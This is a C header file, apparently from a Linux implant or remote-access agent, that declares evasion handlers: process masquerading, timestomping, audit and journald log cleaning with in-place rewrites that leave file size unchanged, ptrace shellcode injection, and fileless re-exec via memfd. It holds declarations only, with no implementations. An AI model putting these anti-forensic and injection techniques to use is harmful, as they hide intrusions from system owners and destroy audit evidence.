#ifndef TASKS_OPSEC_H
#define TASKS_OPSEC_H

#include "types.h"
#include "msgpack.h"

/// OPSEC command handlers

/// masquerade — set process name to fake value
int task_masquerade(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// timestomp — modify file timestamps
int task_timestomp(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// cleanlog — 日志处理：默认安全清理（auditd 判定 + journald 轮转清归档），
///            可选 path+pairs 走**等长就地改写**（文件大小零变化）
int task_cleanlog(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// inject — ptrace-based shellcode injection
int task_inject(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// migrate — re-exec from memfd (fileless)
int task_migrate(mp_writer_t *w);

#endif /* TASKS_OPSEC_H */
